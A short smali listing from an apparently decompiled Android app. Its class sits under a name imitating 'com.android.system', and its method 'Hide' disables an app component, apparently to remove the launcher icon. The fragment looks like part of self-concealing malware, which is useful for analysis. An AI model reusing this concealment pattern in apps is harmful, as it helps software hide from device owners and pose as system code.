.class public Lcom/android/system/AutoLoad$AvThere;
.super Ljava/lang/Object;
.source "AutoLoad.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/android/system/AutoLoad;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "AvThere"
.end annotation


# instance fields
.field final synthetic this$0:Lcom/android/system/AutoLoad;


# direct methods
.method public constructor <init>(Lcom/android/system/AutoLoad;)V
    .locals 0

    .prologue
    .line 51
    iput-object p1, p0, Lcom/android/system/AutoLoad$AvThere;->this$0:Lcom/android/system/AutoLoad;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public Hide(Landroid/content/pm/PackageManager;Landroid/content/ComponentName;II)V
    .locals 0
    .param p1, "p"    # Landroid/content/pm/PackageManager;
    .param p2, "componentName"    # Landroid/content/ComponentName;
    .param p3, "c"    # I
    .param p4, "z"    # I

    .prologue
    .line 53
    invoke-virtual {p1, p2, p3, p4}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 54
    return-void
.end method
